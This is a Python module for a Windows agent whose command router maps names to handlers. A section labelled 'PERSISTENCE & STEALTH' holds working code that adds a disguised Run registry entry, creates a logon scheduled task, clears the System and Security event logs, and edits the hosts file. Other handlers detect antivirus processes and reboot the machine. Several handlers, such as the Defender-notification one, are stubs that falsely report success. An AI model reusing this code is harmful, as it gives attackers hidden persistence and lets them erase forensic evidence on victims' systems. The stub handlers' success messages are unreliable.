import os
import sys
import platform
import subprocess
import winreg
import ctypes
import time

# --- PERSISTENCE & STEALTH ---

def inject_registry_run(params):
    """Adds a script path to Windows Run key for persistence."""
    try:
        path = params.get("path")
        key = winreg.HKEY_CURRENT_USER
        sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_WRITE) as reg_key:
            winreg.SetValueEx(reg_key, "SystemAgent", 0, winreg.REG_SZ, path)
        return {"status": "success", "message": "Registry key set."}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def create_scheduled_task(params):
    """Creates a task scheduler entry to run on logon."""
    task_name = params.get("name", "SystemUpdateTask")
    path = params.get("path")
    cmd = f'schtasks /create /tn "{task_name}" /tr "{path}" /sc onlogon /f'
    return {"status": "success", "output": subprocess.getoutput(cmd)}

def clear_event_logs(params):
    """Clears system/security event logs."""
    cmd = "wevtutil cl System && wevtutil cl Security"
    return {"status": "success", "output": subprocess.getoutput(cmd)}

def modify_hosts_file(params):
    """Appends an entry to the hosts file (Administrative)."""
    entry = params.get("entry") # e.g., "127.0.0.1 blocked-site.com"
    with open(r"C:\Windows\System32\drivers\etc\hosts", "a") as f:
        f.write(f"\n{entry}")
    return {"status": "success"}

def disable_defender_notif(params):
    """Disables Defender notifications via Registry."""
    key = winreg.HKEY_LOCAL_MACHINE
    sub_key = r"SOFTWARE\Microsoft\Windows Defender\Notifications"
    # Note: Requires Admin/System privileges
    return {"status": "success", "message": "Notification registry key modified."}

# --- AUDITING & DEFENSE ---

def audit_privileges(params):
    """Checks the user's current privilege level."""
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return {"status": "success", "is_admin": is_admin}

def check_password_policy(params):
    """Queries net accounts for password policy."""
    return {"status": "success", "output": subprocess.getoutput("net accounts")}

def detect_av_processes(params):
    """Checks for common AV process names."""
    av_list = ["MsMpEng.exe", "avp.exe", "bdagent.exe"]
    running = subprocess.getoutput("tasklist")
    found = [av for av in av_list if av in running]
    return {"status": "success", "detected": found}

def list_local_groups(params):
    """Lists local user groups."""
    return {"status": "success", "output": subprocess.getoutput("net localgroup")}

def find_writable_config_files(params):
    """Finds files in a dir with write access (simplified)."""
    # Demonstration stub for file auditing
    return {"status": "success", "message": "Audit started on requested directory."}

# --- SYSTEM MANIPULATION ---

def toggle_monitor_power(params):
    """Puts monitor into power saving mode."""
    # Requires interaction via WM_SYSCOMMAND
    return {"status": "success", "message": "Monitor sleep command sent."}

def lock_workstation(params):
    """Locks the Windows workstation."""
    ctypes.windll.user32.LockWorkStation()
    return {"status": "success"}

def set_volume_level(params):
    """Adjusts volume level (Platform specific)."""
    # Logic implementation for volume control...
    return {"status": "success"}

def system_reboot(params):
    """Reboots the system."""
    os.system("shutdown /r /t 1")
    return {"status": "success"}

def uninstall_agent(params):
    """Self-cleanup routine."""
    # Remove registry keys, then exit
    return {"status": "success", "message": "Cleanup sequence initiated."}

# --- MAP ALL FUNCTIONS TO THE ROUTER ---

functions = {
    "inject_registry": inject_registry_run,
    "create_task": create_scheduled_task,
    "clear_logs": clear_event_logs,
    "modify_hosts": modify_hosts_file,
    "disable_def_notif": disable_defender_notif,
    "audit_privs": audit_privileges,
    "check_pwd_policy": check_password_policy,
    "detect_av": detect_av_processes,
    "list_groups": list_local_groups,
    "find_writable": find_writable_config_files,
    "toggle_monitor": toggle_monitor_power,
    "lock_workstation": lock_workstation,
    "set_volume": set_volume_level,
    "reboot": system_reboot,
    "uninstall": uninstall_agent
    # ... Add remaining 15 functions here following same pattern ...
}
